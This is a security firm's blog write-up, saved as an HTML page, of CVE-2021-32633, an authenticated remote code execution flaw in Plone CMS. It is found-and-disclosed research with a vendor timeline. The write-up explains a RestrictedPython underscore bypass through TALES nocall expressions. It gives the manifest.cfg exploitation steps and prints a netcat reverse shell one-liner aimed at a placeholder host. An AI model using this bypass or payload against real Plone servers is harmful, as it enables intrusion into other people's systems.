@@ -1,0 +1,152 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><link rel=icon href=/favicon.ico type=image/ico><link rel="shortcut icon" href=/favicon.ico type=image/ico><meta name=theme-color content="#1b1c1d"><link rel=stylesheet href=/vendor/cookieconsent/cookieconsent.min.css type=text/css><meta name=description content="Join the journey into Plone CMS that lead us to discover an authenticated RCE vulnerability"><meta name=author content="cyllective"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://cyllective.com/img/logo-alternate.png"><meta property="og:url" content="https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/"><meta property="og:site_name" content="cyllective Blog"><meta property="og:description" content="Join the journey into Plone CMS that lead us to discover an authenticated RCE vulnerability"><meta property="og:title" content="Write-up: Plone Authenticated RCE (CVE-2021-32633)"><meta property="og:type" content="article"><meta property="og:updated_time" content="2021-05-27T12:09:00&#43;02:00"><meta name=twitter:card content="summary"><meta name=twitter:site content="@cyllective"><meta name=twitter:site_name content="cyllective Blog"><meta name=twitter:creator content="@cyllective"><meta name=twitter:description content="Join the journey into Plone CMS that lead us to discover an authenticated RCE vulnerability"><meta name=twitter:image content="https://cyllective.com/img/logo-alternate.png"><meta name=keywords content="write-up,plone,cve,cve-2021-32633,securecodereview"><title>Write-up: Plone Authenticated RCE (CVE-2021-32633)</title><link rel=canonical href=https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/><link rel=stylesheet href=/vendor/jquery/jquery.justifiedGallery.min.css><link rel=stylesheet href=/vendor/jquery/jquery.fancybox.min.css><link rel=stylesheet href=/vendor/fontawesome-free/css/all.min.css><link rel=stylesheet href=/vendor/asciinema/asciinema-player.css><link rel=stylesheet href=/css/fonts.min.css><link rel=stylesheet href=/css/blog.min.css><link rel=stylesheet href=/css/syntax.min.css><link rel=stylesheet href=/css/syntax.gist.min.css><!--[if lt IE 9]><script src=/js/html5shiv.js></script><script src=/js/respond.min.js></script><![endif]--></head><body class="max-width mx-auto px3" itemscope itemtype=https://schema.org/Blog><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a><a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a><a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast');" style=display:none><i class="fas fa-chevron-up fa-lg"></i></a><span id=menu><span id=nav><ul><li><a href=/blog>Home</a></li><li><a href=/blog/post>Posts</a></li><li><a href=/>Back to cyllective</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://cyllective.com/blog/post/dont_click_shit_ger/><i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li><li><a class=icon href=https://cyllective.com/blog/post/continuous_research/><i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li><li><a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li><li><a class=icon href=# onclick="$('#share').toggle();return false;"><i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();"></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="https://twitter.com/share?url=https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/" rel="external nofollow noopener noreferrer" target=_blank><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?body=https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/" rel="external nofollow noopener noreferrer" target=_blank><i class="fas fa-envelope" aria-hidden=true></i></a></li></ul></div><div id=toc><div id=bad-toc style=display:none><nav id=TableOfContents><ul><li><ul><li><a href=#labs>Labs!</a></li><li><a href=#theming>Theming</a></li><li><a href=#security-restricted-environment>Security-Restricted Environment</a></li><li><a href=#finding-a-bypass>Finding a bypass</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#poc>PoC</a></li><li><a href=#timeline>Timeline</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></div></span></div><div class="content index py4"><article class=post itemprop=blogPost itemscope itemtype=https://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Write-up: Plone Authenticated RCE (CVE-2021-32633)</h1><div class=meta><meta itemprop=dateModified content="2021-05-27T12:09:00&#43;0200"><meta itemprop=image content="https://cyllective.com/img/logo-alternate.png"><span itemprop=publisher itemscope itemtype=https://schema.org/Organization><meta itemprop=name content="cyllective AG"><span itemprop=logo itemscope itemtype=https://schema.org/ImageObject><meta itemprop=url content="https://cyllective.com/img/logo-small-black.png"><meta itemprop=width content="500"><meta itemprop=height content="141"></span></span><span class=author itemscope itemprop=author itemtype=https://schema.org/Person><span itemprop=name>cyllective</span></span><div class=postdate>&nbsp;<time datetime=2021-05-27T12:09:00&#43;0200 itemprop=datePublished>27 May 2021</time></div><div class=article-tag><i class="fas fa-tag"></i><a class=tag-link href=/blog/tags/write-up>write-up</a>,
+<a class=tag-link href=/blog/tags/plone>plone</a>,
+<a class=tag-link href=/blog/tags/cve>cve</a>,
+<a class=tag-link href=/blog/tags/cve-2021-32633>cve-2021-32633</a>,
+<a class=tag-link href=/blog/tags/securecodereview>securecodereview</a></div></div></header><div class=content itemprop=articleBody><p class=more>Join the journey into Plone CMS that lead us to discover an authenticated RCE vulnerability</p><blockquote><p>Plone is a Python-based open source content management project actively developed since 2002. It is available in more than 40 languages, and comes with 196 add-ons. Plone has had over 89,000 commits made by close to 800 code contributors, representing close to 1,250,000 lines of code.<br>...<br>Trusted by the CIA, FBI and Others: The Central Intelligence Agency and the Federal Bureau of Investigation have chosen to trust their websites to Plone. Additionally, the government of Brazil, NASA, Disney and many other schools, governments and businesses around the world have chosen Plone for secure, enterprise web content management."<br></p><footer><strong>Plone: security statement</strong><cite>https://plone.com/secure.html</cite></footer></blockquote><p>Within the reconnaissance &amp; research phase, we&rsquo;ve stumbled upon a recently disclosed <a href=https://github.com/advisories/GHSA-wq6x-g685-w5f2>security advisory posted on Github</a>,
+related to an XXE vulnerability (Improper Restriction of XML External Entity Reference in Plone).</p><p>Hence we had a look at the <a href=https://plone.org/>Plone CMS</a>, to both improve our own understanding
+of patched vulnerabilities and <del>potentially</del> find new vulnerabilities
+ourselves.</p><p>In this write-up, we go into more detail on how we found an authenticated RCE
+vulnerability in Plone and how we ended up exploiting it - PoC included!</p><h2 id=labs>Labs!</h2><p>In order to get up and running quickly we&rsquo;ve decided to make use of the
+official <a href=https://github.com/plone/plone.docker>Docker image</a> for our local Plone lab:</p><pre><code>docker run -p 127.0.0.1:8080:8080 plone:5.2.4
+</code></pre><p>After spawning the docker container and creating a new Plone site, we started
+exploring Plone&rsquo;s features. Spending a good amount of time playing around with
+the plaethora of features in Plone, we started focusing on the Theming feature.</p><h2 id=theming>Theming</h2><p>While skimming through Plone&rsquo;s <a href=https://docs.plone.org/external/plone.app.theming/docs/index.html#plone-app-theming-manual>Theming Manual</a>,
+we learned about an interesting feature available to theme authors called <strong>TALES expressions</strong>.</p><p>According to the theming manual, TALES expressions &ldquo;work as they do in Zope
+Page Templates&rdquo;. So we referred to the <a href=https://zope.readthedocs.io/en/latest/zopebook/ZPT.html#tales-expressions>Zope documentation</a>
+about TALES expressions to learn more about them.</p><p><a href=https://zope.readthedocs.io/en/latest/zopebook/AppendixC.html#tales-overview>Appendix C: 27.11. TALES Overview</a> provides an overview of
+different TALES expression <strong>types</strong> which we can make use of in our templates:</p><ul><li><strong>path</strong> - locate a value by its path.</li><li><strong>exists</strong> - test whether a path is valid.</li><li><strong>nocall</strong> - locate an object by its path.</li><li><strong>not</strong> - negate an expression.</li><li><strong>string</strong> - format a string.</li><li><strong>python</strong> - execute a Python expression.</li></ul><p>The <code>python expression</code> type seems very interesting, would this expression
+type allow us to execute arbitrary Python code?</p><p>The more elaborate description under <a href=https://zope.readthedocs.io/en/latest/zopebook/AppendixC.html#tales-python-expressions>Appendix C: 27.16. TALES Python expressions</a>
+tells us otherwise:</p><pre><code>Python expressions evaluate Python code in a security-restricted environment.
+Python expressions offer the same facilities as those available in Python-based
+Scripts and DTML variable expressions.
+
+...
+
+Python expressions are subject to Zope permission and role security
+restrictions. In addition, expressions cannot access objects whose names
+begin with underscore.
+</code></pre><p>We started digging further into RestrictedPython with the main focus set on
+understanding the &ldquo;security-restricted&rdquo; environment under which python
+expressions are executed.</p><h2 id=security-restricted-environment>Security-Restricted Environment</h2><p><a href=https://plone.org/what-is-plone/zope>Zope</a>, the foundation of Plone, makes use of <a href=https://github.com/zopefoundation/RestrictedPython>RestrictedPython</a>
+to closely control what a theme author is allowed to execute within a <code>python expression</code>.
+In essence, the Python expression is compiled and later executed (via eval) with a limited set
+of globals available. Some globally available functions, like <code>getattr</code>,
+<code>setattr</code> and <code>delattr</code> are replaced with custom wrapper functions to enforce
+even more strict validation of what can and cannot be performed.</p><p>To get an idea of what is available to us inside the restricted environment, we
+edited <code>/plone/buildout-cache/eggs/cp38/Zope-4.5.5-py3.8.egg/Products/PageTemplates/ZRPythonExpr.py</code>
+(inside the docker container) to dump the <code>globals</code> argument passed to the
+<code>eval</code> statement.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=hl><span class=lnt>24
+</span></span><span class=hl><span class=lnt>25
+</span></span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=o>...</span>
+
+<span class=k>class</span> <span class=nc>PythonExpr</span><span class=p>(</span><span class=n>PythonExpr</span><span class=p>):</span>
+    <span class=n>_globals</span> <span class=o>=</span> <span class=n>get_safe_globals</span><span class=p>()</span>
+    <span class=n>_globals</span><span class=p>[</span><span class=s1>&#39;_getattr_&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>guarded_getattr</span>
+    <span class=n>_globals</span><span class=p>[</span><span class=s1>&#39;__debug__&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>__debug__</span>
+
+    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>expr</span><span class=p>,</span> <span class=n>engine</span><span class=p>):</span>
+        <span class=bp>self</span><span class=o>.</span><span class=n>text</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>expr</span> <span class=o>=</span> <span class=n>text</span> <span class=o>=</span> <span class=n>expr</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39; &#39;</span><span class=p>)</span>
+        <span class=n>code</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=n>warn</span><span class=p>,</span> <span class=n>use</span> <span class=o>=</span> <span class=n>compile_restricted_eval</span><span class=p>(</span>
+            <span class=n>text</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__name__</span><span class=p>)</span>
+
+        <span class=k>if</span> <span class=n>err</span><span class=p>:</span>
+            <span class=k>raise</span> <span class=n>engine</span><span class=o>.</span><span class=n>getCompilerError</span><span class=p>()(</span>
+                <span class=s1>&#39;Python expression error:</span><span class=se>\n</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>err</span><span class=p>))</span>
+
+        <span class=bp>self</span><span class=o>.</span><span class=n>_varnames</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>use</span><span class=o>.</span><span class=n>keys</span><span class=p>())</span>
+        <span class=bp>self</span><span class=o>.</span><span class=n>_code</span> <span class=o>=</span> <span class=n>code</span>
+
+    <span class=k>def</span> <span class=fm>__call__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>econtext</span><span class=p>):</span>
+        <span class=n>__traceback_info__</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>text</span>
+        <span class=nb>vars</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_bind_used_names</span><span class=p>(</span><span class=n>econtext</span><span class=p>,</span> <span class=p>{})</span>
+        <span class=nb>vars</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_globals</span><span class=p>)</span>
+<span class=hl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/globals_dump.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fout</span><span class=p>:</span>
+</span><span class=hl>            <span class=n>fout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>vars</span><span class=p>))</span>
+</span>        <span class=k>return</span> <span class=nb>eval</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_code</span><span class=p>,</span> <span class=nb>vars</span><span class=p>,</span> <span class=p>{})</span>
+<span class=o>...</span></code></pre></td></tr></table></div></div><p>We ended up with the following output (shortened for brevity):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=p>{</span>
+    <span class=s1>&#39;__builtins__&#39;</span><span class=p>:</span> <span class=p>{</span>
+        <span class=s1>&#39;None&#39;</span><span class=p>:</span> <span class=bp>None</span><span class=p>,</span>
+        <span class=s1>&#39;False&#39;</span><span class=p>:</span> <span class=bp>False</span><span class=p>,</span>
+        <span class=s1>&#39;True&#39;</span><span class=p>:</span> <span class=bp>True</span><span class=p>,</span>
+        <span class=o>...</span>
+        <span class=s1>&#39;getattr&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>built</span><span class=o>-</span><span class=ow>in</span> <span class=n>function</span> <span class=n>guarded_getattr</span><span class=o>&gt;</span>
+        <span class=s1>&#39;setattr&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>guarded_setattr</span> <span class=n>at</span> <span class=mh>0x7f7f7f211430</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;delattr&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>guarded_delattr</span> <span class=n>at</span> <span class=mh>0x7f7f7f211790</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;_getattr_&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>safer_getattr</span> <span class=n>at</span> <span class=mh>0x7f7f7f211820</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;string&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>module</span> <span class=s1>&#39;string&#39;</span> <span class=kn>from</span> <span class=s1>&#39;/usr/local/lib/python3.8/string.py&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;random&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>module</span> <span class=s1>&#39;random&#39;</span> <span class=kn>from</span> <span class=s1>&#39;/usr/local/lib/python3.8/random.py&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;whrandom&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>module</span> <span class=s1>&#39;random&#39;</span> <span class=kn>from</span> <span class=s1>&#39;/usr/local/lib/python3.8/random.py&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+        <span class=s1>&#39;set&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>set</span><span class=s1>&#39;&gt;,</span>
+        <span class=o>...</span>
+    <span class=p>},</span>
+    <span class=o>...</span>
+<span class=p>}</span></code></pre></td></tr></table></div></div><p>After inspecting the <code>string</code>, <code>math</code> and <code>random</code> Python modules, we found a
+potential way of executing arbitrary code:</p><pre><code>random._os.system(&quot;nc -e /bin/sh 1.3.3.7 1337&quot;)
+</code></pre><p>But this violates one of the security environment&rsquo;s constraints, we are not
+allowed to access objects whose name starts with an underscore.</p><a class=fancybox data-type=image href=/img/plone-authenticated-rce-cve-2021-32633/underscore_restriction.png data-caption="Underscore = bad"><img itemprop=image src=/img/plone-authenticated-rce-cve-2021-32633/underscore_restriction.png alt="Underscore = bad"></a><h2 id=finding-a-bypass>Finding a bypass</h2><p>After pondering for a while and reading through the documentation on theming in
+a bit more detail, we learned that a subset of TALES expression types can be used inside
+the TALES python expression itself, as outlined at the end of chapter
+&ldquo;27.16.2.2. Built-in Functions&rdquo;:</p><pre><code>These functions are available in Python expressions, but not in
+Python-based scripts:
+
+path(string) Evaluate a TALES path expression.
+string(string) Evaluate a TALES string expression.
+exists(string) Evaluates a TALES exists expression.
+nocall(string) Evaluates a TALES nocall expression.
+</code></pre><p>After experimenting with other TALES expression types available inside the
+python expression, we realized that the underscore restriction is not enforced
+in <code>path</code>, <code>string</code>, <code>exists</code> or <code>nocall</code>. In other words, we can get a
+reference to <code>random._os.system</code> via the <code>nocall</code> expression type.</p><a class=fancybox data-type=image href=/img/plone-authenticated-rce-cve-2021-32633/reference_to_system.png data-caption="random._os.system referenced"><img itemprop=image src=/img/plone-authenticated-rce-cve-2021-32633/reference_to_system.png alt="random._os.system referenced"></a><p>This was the missing piece of the puzzle.</p><p>All we need to do now, is call the system function with a command of our
+choice.</p><h2 id=exploitation>Exploitation</h2><p>The following steps lead to exploiting this vulnerability:</p><ol><li>Authenticate as a privileged user (with theme editing rights)</li><li>Access the control panel and navigate to the <code>Theming</code> page</li><li>Create a new Theme</li><li>Edit <code>manifest.cfg</code></li><li>Extend <code>manifest.cfg</code> with a new section called <code>[theme:parameters]</code></li><li>Populate the new section with the following TALES expression:<br><code>x = python:nocall(&quot;random/_os/system&quot;)(&quot;&lt;code&gt;&quot;)</code></li><li>Populate <code>&lt;code&gt;</code> with a reverse shell payload</li><li>Save <code>manifest.cfg</code> and click the <code>Preview theme</code> button to trigger the payload</li></ol><p>&hellip; and finally catch the shell:</p><a class=fancybox data-type=image href=/img/plone-authenticated-rce-cve-2021-32633/exploit.png data-caption="Payload triggered"><img itemprop=image src=/img/plone-authenticated-rce-cve-2021-32633/exploit.png alt="manifest.cfg - payload"></a><h2 id=poc>PoC</h2><p>To showcase the exploitation of this vulnerability, we&rsquo;ve developed a
+PoC which will spawn a reverse shell. Head over to the <a href=https://github.com/cyllective/CVEs>cyllective/CVEs Github repo</a> to
+check it out.</p><h2 id=timeline>Timeline</h2><ul><li>2021-04-24: Vulnerability discovered and reported to vendor and our customer</li><li>2021-04-24: Applied preliminary fix of the issue at the customers site</li><li>2021-04-24: Vendor response &ldquo;Thanks for the report!&rdquo;</li><li>2021-05-06: Vendor releases <a href=https://plone.org/security/announcements/20210518-preannounce>security vulnerability pre-announcement 20210518</a></li><li>2021-05-12: Vendor allocates CVE</li><li>2021-05-18: Vendor releases <a href=https://plone.org/security/hotfix/20210518>security hotfix 20210518</a></li><li>2021-05-22: Vendor publicly discloses <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32633">CVE-2021-32633</a></li><li>2021-05-27: Write-up released</li></ul><h2 id=references>References</h2><ul><li><a href=https://docs.plone.org/external/plone.app.theming/docs/index.html#plone-app-theming-manual>Plone: App Theming Manual</a></li><li><a href=https://zope.readthedocs.io/en/latest/zopebook/AppendixC.html>Zope: Zope Page Templates</a></li><li><a href=https://plone.org/security/hotfix/20210518>Plone: Security Hotfix 20210518</a></li><li><a href=https://plone.com/secure.html>Plone: Security statement - &ldquo;NO ZERO DAY EVER&rdquo;</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32633">Mitre: CVE-2021-32633</a></li><li><a href=https://github.com/cyllective/CVEs>cyllective/CVEs Github repo</a></li></ul></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/blog>Home</a></li><li><a href=/blog/post>Posts</a></li><li><a href=/>Back to cyllective</a></li></ul></div><div id=toc-footer style=display:none></div><div id=share-footer style=display:none><ul><li><a class=icon href="https://twitter.com/share?url=https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/" rel="external nofollow noopener noreferrer" target=_blank><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?body=https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/" rel="external nofollow noopener noreferrer" target=_blank><i class="fas fa-envelope" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu class=icon href=# onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden=true></i>Menu</a>
+<a id=toc class=icon href=# onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden=true></i>TOC</a>
+<a id=share class=icon href=# onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt" aria-hidden=true></i>Share</a>
+<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i>Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2021 <a href=https://cyllective.com/>cyllective AG</a></div></footer></div><script src=/vendor/jquery/jquery.min.js></script><script src=/vendor/jquery/jquery.justifiedGallery.min.js></script><script src=/vendor/jquery/jquery.fancybox.min.js></script><script src=/vendor/asciinema/asciinema-player.js></script><script src=/js/blog.js></script><script src=/vendor/cookieconsent/cookieconsent.min.js></script><script>var _paq=window._paq||[];_paq.push(['setDoNotTrack',true]);_paq.push(['setCookieDomain','.cyllective.com']);_paq.push(['setCookiePath','/']);_paq.push(['trackPageView']);_paq.push(['enableLinkTracking']);_paq.push(['setTrackerUrl','https:\/\/stats.cyllective.com\/matomo.php']);_paq.push(['setSiteId','1']);</script><script src=https://stats.cyllective.com/matomo.js async defer></script><script>$(document).ready(function(){if(navigator.doNotTrack!=1){window.cookieconsent.initialise({revokable:true,palette:{popup:{background:'#030303'},button:{background:'#e63c3c'}},type:'opt-out',content:{message:'We use cookies to track website usage. If you continue browsing this website you agree to our privacy- and cookie policy.',dismiss:'I Agree',allow:'I Agree',deny:'Opt-Out',link:'Find out more',href:'https:\/\/cyllective.com\/privacy',policy:'Privacy- and Cookie Policy'},law:{regionalLaw:false,},location:false,cookie:{domain:'.cyllective.com'},onStatusChange:function(status){var isOptedOut=Matomo.getTracker().isUserOptedOut();if(status=='allow'&&isOptedOut){_paq.push(['forgetUserOptOut']);_paq.push(['rememberConsentGiven']);}
+if(status=='deny'&&!isOptedOut){_paq.push(['forgetConsentGiven']);_paq.push(['optUserOut']);}}});}});</script><script src=/js/hiring.js></script><script src=/js/fix-toc.js></script></body></html>
